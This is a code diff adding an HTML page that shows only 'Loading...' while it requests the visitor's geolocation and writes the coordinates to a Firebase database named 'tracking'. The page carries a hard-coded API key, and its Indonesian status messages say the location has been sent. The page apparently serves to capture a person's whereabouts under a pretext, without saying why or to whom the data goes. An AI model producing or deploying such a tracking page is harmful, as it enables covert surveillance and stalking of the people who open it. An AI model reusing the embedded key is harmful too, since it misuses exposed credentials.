@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>Loading...</h2>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyDRAKVsQDg-7sQpUloHi_mrLfbus2jKxQs",
+  databaseURL: "https://tracking-7945d-default-rtdb.asia-southeast1.firebasedatabase.app"
+};
+
+firebase.initializeApp(firebaseConfig);
+
+navigator.geolocation.getCurrentPosition(function(pos){
+
+  firebase.database().ref("lokasi").set({
+    lat: pos.coords.latitude,
+    lon: pos.coords.longitude
+  });
+
+  document.body.innerHTML = "✅ Lokasi terkirim";
+
+}, function(){
+  document.body.innerHTML = "❌ Izin lokasi ditolak";
+});
+</script>
+
+</body>
+</html>
